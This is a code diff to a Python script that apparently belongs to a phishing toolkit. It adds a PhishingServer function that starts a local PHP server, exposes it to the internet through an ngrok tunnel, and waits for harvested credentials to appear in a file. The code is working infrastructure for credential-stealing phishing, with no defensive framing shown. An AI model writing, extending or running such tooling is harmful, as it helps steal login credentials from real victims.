@@ -12,6 +12,7 @@
 
 from contextlib import contextmanager
 import json
+import multiprocessing
 import requests
 import os
 from time import sleep
@@ -39,12 +40,19 @@ def waitCreds():
             os.system('rm -rf base/Server/www/cat.txt && touch base/Server/www/cat.txt')
         creds.close()
 
-def runServer():
-    os.system("cd base/Server/www/ && php -n -S 127.0.0.1:1449 > /dev/null 2>&1 &")
+@contextmanager
+def runServer(port: int):
+    def php_process():
+        os.system("cd base/Server/www/ && php -n -S 127.0.0.1:%d > /dev/null 2>&1 &" % port)    
+    php_process = multiprocessing.Process(target=php_process)
+    php_process.start()
+    yield php_process
+    php_process.terminate()
+    php_process.close()
 
 @contextmanager
-def ngrok_start():
-    ngrok_process = subprocess.Popen(['ngrok','http','1449'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+def ngrok_start(port: int):
+    ngrok_process = subprocess.Popen(['./base/Server/ngrok','http','%s' % port], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
     while True:
         try:
             ngrok_url = requests.get('http://127.0.0.1:4040/api/tunnels/command_line')
@@ -58,3 +66,7 @@ def ngrok_start():
             sleep(.5)
     os.kill(ngrok_process.pid, 15)
 
+def PhishingServer(port: int=1449):
+    with ngrok_start(port) as ngrok:
+        with runServer(port) as php:
+            waitCreds()
